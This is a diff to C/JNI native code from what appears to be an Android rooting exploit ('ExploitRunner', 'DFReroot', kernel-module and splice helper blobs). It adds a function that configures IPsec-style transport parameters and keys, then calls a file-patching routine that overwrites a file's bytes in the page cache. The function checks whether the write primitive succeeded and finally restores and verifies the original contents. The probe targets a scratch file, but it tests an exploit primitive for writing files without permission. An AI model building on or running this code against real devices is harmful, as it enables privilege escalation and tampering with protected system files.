@@ -285,6 +285,123 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     return rc;
 }
 
+static void report_hex16(struct Reporter *reporter, const char *label,
+                         const uint8_t bytes[16]) {
+    char hex[33];
+    for (int i = 0; i < 16; i++)
+        snprintf(hex + i * 2, sizeof(hex) - (size_t)i * 2, "%02x", bytes[i]);
+    REPORTLN("scratch probe bytes: %s=%s", label, hex);
+}
+
+/* Exercise only the page-cache primitive against an app-private scratch file.
+ * The original bytes are restored with an ordinary owned-file write, synced,
+ * evicted, reopened, and verified before the caller deletes the file. */
+JNIEXPORT jint JNICALL
+Java_df_root_ExploitRunner_nativeProbeScratch(JNIEnv *env,
+                                               jclass clz __attribute__((unused)),
+                                               jobject reporter_obj,
+                                               jstring scratchPath,
+                                               jint encapPort, jint spi,
+                                               jbyteArray aesCbcKey,
+                                               jbyteArray hmacKey, jint icvLen,
+                                               jint senderPort) {
+    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
+    const char *path = (*env)->GetStringUTFChars(env, scratchPath, NULL);
+    if (!path) return 10;
+
+    g_encap_port = (int)encapPort;
+    g_sender_port = (int)senderPort;
+    g_spi = (uint32_t)spi;
+    g_seq = 1;
+    g_icv_len = (int)icvLen;
+
+    jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
+    jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
+    if (!kb || !hb) {
+        if (kb) (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);
+        if (hb) (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
+        (*env)->ReleaseStringUTFChars(env, scratchPath, path);
+        return 10;
+    }
+    memcpy(g_aes_key, kb, 32);
+    memcpy(g_hmac_key, hb, 32);
+    (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);
+    (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
+
+    int fd = open(path, O_RDWR | O_CLOEXEC);
+    if (fd < 0) {
+        REPORTLN("scratch probe setup failed: open errno=%d (%s)", errno, strerror(errno));
+        (*env)->ReleaseStringUTFChars(env, scratchPath, path);
+        return 10;
+    }
+
+    struct stat st;
+    int fstat_rc = fstat(fd, &st);
+    if (fstat_rc != 0 || st.st_size < 16) {
+        REPORTLN("scratch probe setup failed: fstat errno=%d size=%lld",
+                 errno, (long long)(fstat_rc == 0 ? st.st_size : -1));
+        close(fd);
+        (*env)->ReleaseStringUTFChars(env, scratchPath, path);
+        return 10;
+    }
+    REPORTLN("scratch probe file: dev=%llu inode=%llu mode=0%o size=%lld offset=0x0 len=16",
+             (unsigned long long)st.st_dev, (unsigned long long)st.st_ino,
+             st.st_mode & 07777, (long long)st.st_size);
+
+    uint8_t before[16], requested[16], observed[16], restored[16];
+    if (pread(fd, before, sizeof(before), 0) != (ssize_t)sizeof(before)) {
+        REPORTLN("scratch probe setup failed: pread errno=%d (%s)", errno, strerror(errno));
+        close(fd);
+        (*env)->ReleaseStringUTFChars(env, scratchPath, path);
+        return 10;
+    }
+    for (int i = 0; i < 16; i++) requested[i] = before[i] ^ 0xa5U;
+    report_hex16(reporter, "before", before);
+    report_hex16(reporter, "requested", requested);
+
+    int transport_rc = patch_file_cbc(path, (const char *)requested, 16, 0, 0, reporter);
+    usleep(50000);
+    ssize_t observed_len = pread(fd, observed, sizeof(observed), 0);
+    report_hex16(reporter, "observed", observed_len == 16 ? observed : before);
+
+    int result;
+    if (transport_rc != 0 || observed_len != 16) {
+        REPORTLN("scratch probe state: transport_failed rc=%d observed_len=%zd",
+                 transport_rc, observed_len);
+        result = 11;
+    } else if (memcmp(observed, requested, 16) == 0) {
+        REPORTLN("scratch probe state: primitive_confirmed_exact_match");
+        result = 0;
+    } else if (memcmp(observed, before, 16) == 0) {
+        REPORTLN("scratch probe state: transport_completed_bytes_unchanged");
+        result = 12;
+    } else {
+        REPORTLN("scratch probe state: ambiguous_unexpected_bytes");
+        result = 13;
+    }
+
+    int restore_ok = pwrite(fd, before, sizeof(before), 0) == (ssize_t)sizeof(before)
+                     && fsync(fd) == 0;
+    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
+    close(fd);
+    fd = open(path, O_RDONLY | O_CLOEXEC);
+    if (fd < 0 || pread(fd, restored, sizeof(restored), 0) != (ssize_t)sizeof(restored)) {
+        restore_ok = 0;
+        memset(restored, 0, sizeof(restored));
+    }
+    if (fd >= 0) close(fd);
+    report_hex16(reporter, "reopened_after_restore", restored);
+    if (!restore_ok || memcmp(restored, before, 16) != 0) {
+        REPORTLN("scratch probe cleanup state: restore_verification_failed");
+        result = 14;
+    } else {
+        REPORTLN("scratch probe cleanup state: restored_and_reopened_exact_match");
+    }
+
+    (*env)->ReleaseStringUTFChars(env, scratchPath, path);
+    return result;
+}
+
 /* ---- KO and splicehelper blobs (identical layout to DFReroot) ---- */
 
 extern char libcxx_start[];
